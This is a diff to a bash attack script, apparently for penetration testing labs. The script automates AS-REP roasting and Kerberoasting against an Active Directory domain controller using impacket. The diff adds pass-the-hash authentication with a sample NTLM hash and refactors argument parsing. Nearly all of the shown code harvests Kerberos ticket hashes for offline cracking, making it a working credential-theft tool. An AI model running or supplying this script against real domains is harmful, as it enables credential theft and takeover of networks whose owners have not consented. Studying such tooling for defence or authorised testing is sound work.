@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Author: strikoder
 # File: auth_kerberos
-# Usage: ./auth_kerberos <USERNAME> <PASSWORD> <DC_IP> <DOMAIN>
+# Usage: ./auth_kerberos [-u <USERNAME> -p <PASSWORD> | -u <USERNAME> -H <HASH>] -i <DC_IP> -d <DOMAIN>
 #
 # Purpose:
 #   Authenticated Kerberos attacks:
@@ -22,15 +22,44 @@ readonly CYAN='\033[0;36m'
 readonly MAGENTA='\033[0;35m'
 readonly NC='\033[0m' # No Color
 
-USER="${1:-}"
-PASS="${2:-}"
-IP="${3:-}"
-DOMAIN="${4:-}"
+# Parse arguments
+USER=""
+PASS=""
+HASH=""
+IP=""
+DOMAIN=""
 
-if [[ -z "${USER}" || -z "${PASS}" || -z "${IP}" || -z "${DOMAIN}" ]]; then
-  echo -e "${RED}[!] Usage: $0 <USERNAME> <PASSWORD> <DC_IP> <DOMAIN>${NC}" >&2
-  echo "Example: $0 pete 'Password123' 192.168.105.70 corp.com"
+usage() {
+  echo -e "${RED}[!] Usage: $0 -u <USERNAME> [-p <PASSWORD> | -H <HASH>] -i <DC_IP> -d <DOMAIN>${NC}" >&2
+  echo "Example with password: $0 -u pete -p 'Password123' -i 192.168.105.70 -d corp.com"
+  echo "Example with hash: $0 -u pete -H 'aad3b435b51404eeaad3b435b51404ee:64fbae31cc352fc26af97cbdef151e03' -i 192.168.105.70 -d corp.com"
   exit 1
+}
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -u) USER="$2"; shift 2 ;;
+    -p) PASS="$2"; shift 2 ;;
+    -H) HASH="$2"; shift 2 ;;
+    -i) IP="$2"; shift 2 ;;
+    -d) DOMAIN="$2"; shift 2 ;;
+    *) usage ;;
+  esac
+done
+
+# Validation
+if [[ -z "$USER" || -z "$IP" || -z "$DOMAIN" ]]; then
+  usage
+fi
+
+if [[ -z "$PASS" && -z "$HASH" ]]; then
+  echo -e "${RED}[!] Must provide either -p <PASSWORD> or -H <HASH>${NC}" >&2
+  usage
+fi
+
+if [[ -n "$PASS" && -n "$HASH" ]]; then
+  echo -e "${RED}[!] Cannot use both -p and -H${NC}" >&2
+  usage
 fi
 
 section_header() {
@@ -89,8 +118,11 @@ TIMESTAMP=$(date +%Y%m%d_%H%M%S)
 OUTDIR="results_auth_kerberos/${DOMAIN}_${TIMESTAMP}"
 mkdir -p "$OUTDIR"
 
+AUTH_TYPE="password"
+[[ -n "$HASH" ]] && AUTH_TYPE="hash"
+
 log_info "Output directory: ${MAGENTA}${OUTDIR}${NC}"
-log_info "Target: DC=${MAGENTA}${IP}${NC} | Domain=${MAGENTA}${DOMAIN}${NC} | User=${MAGENTA}${USER}${NC}"
+log_info "Target: DC=${MAGENTA}${IP}${NC} | Domain=${MAGENTA}${DOMAIN}${NC} | User=${MAGENTA}${USER}${NC} | Auth=${MAGENTA}${AUTH_TYPE}${NC}"
 echo ""
 
 # AS-REP Roasting
@@ -103,19 +135,38 @@ asrep_roast() {
   log_info "Searching for AS-REP roastable accounts..."
   echo ""
   
-  if impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
-    echo ""
-    # Extract hashes
-    if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
-      grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
-      local COUNT=$(wc -l < "$HASHFILE")
-      log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
-      log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+  if [[ -n "$HASH" ]]; then
+    # Use hash authentication
+    if impacket-GetNPUsers "$DOMAIN/$USER" -dc-ip "$IP" -hashes "$HASH" -request 2>&1 | tee "$LOGFILE"; then
+      echo ""
+      # Extract hashes
+      if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
+        grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
+        local COUNT=$(wc -l < "$HASHFILE")
+        log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
+        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+      else
+        log_warning "No AS-REP roastable accounts found"
+      fi
     else
-      log_warning "No AS-REP roastable accounts found"
+      log_error "AS-REP roasting failed - check credentials or connectivity"
     fi
   else
-    log_error "AS-REP roasting failed - check credentials or connectivity"
+    # Use password authentication
+    if impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
+      echo ""
+      # Extract hashes
+      if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
+        grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
+        local COUNT=$(wc -l < "$HASHFILE")
+        log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
+        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+      else
+        log_warning "No AS-REP roastable accounts found"
+      fi
+    else
+      log_error "AS-REP roasting failed - check credentials or connectivity"
+    fi
   fi
 }
 
@@ -129,19 +180,38 @@ kerberoast() {
   log_info "Searching for Kerberoastable accounts (SPNs)..."
   echo ""
   
-  if impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
-    echo ""
-    # Extract hashes
-    if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
-      grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
-      local COUNT=$(wc -l < "$HASHFILE")
-      log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
-      log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+  if [[ -n "$HASH" ]]; then
+    # Use hash authentication
+    if impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$IP" -hashes "$HASH" -request 2>&1 | tee "$LOGFILE"; then
+      echo ""
+      # Extract hashes
+      if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
+        grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
+        local COUNT=$(wc -l < "$HASHFILE")
+        log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
+        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+      else
+        log_warning "No Kerberoastable accounts found"
+      fi
     else
-      log_warning "No Kerberoastable accounts found"
+      log_error "Kerberoasting failed - check credentials or connectivity"
     fi
   else
-    log_error "Kerberoasting failed - check credentials or connectivity"
+    # Use password authentication
+    if impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
+      echo ""
+      # Extract hashes
+      if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
+        grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
+        local COUNT=$(wc -l < "$HASHFILE")
+        log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
+        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
+      else
+        log_warning "No Kerberoastable accounts found"
+      fi
+    else
+      log_error "Kerberoasting failed - check credentials or connectivity"
+    fi
   fi
 }
 
@@ -169,15 +239,15 @@ log_success "Results saved to: ${GREEN}${OUTDIR}/${NC}"
 echo ""
 
 # Summary with counts
-local HAS_RESULTS=false
+HAS_RESULTS=false
 if [[ -f "$OUTDIR/asrep_hashes.txt" ]] && [[ -s "$OUTDIR/asrep_hashes.txt" ]]; then
-  local ASREP_COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
+  ASREP_COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
   log_success "AS-REP hashes: ${GREEN}${ASREP_COUNT} found${NC} → ${OUTDIR}/asrep_hashes.txt"
   HAS_RESULTS=true
 fi
 
 if [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && [[ -s "$OUTDIR/kerberoast_hashes.txt" ]]; then
-  local KERB_COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
+  KERB_COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
   log_success "Kerberoast hashes: ${GREEN}${KERB_COUNT} found${NC} → ${OUTDIR}/kerberoast_hashes.txt"
   HAS_RESULTS=true
 fi
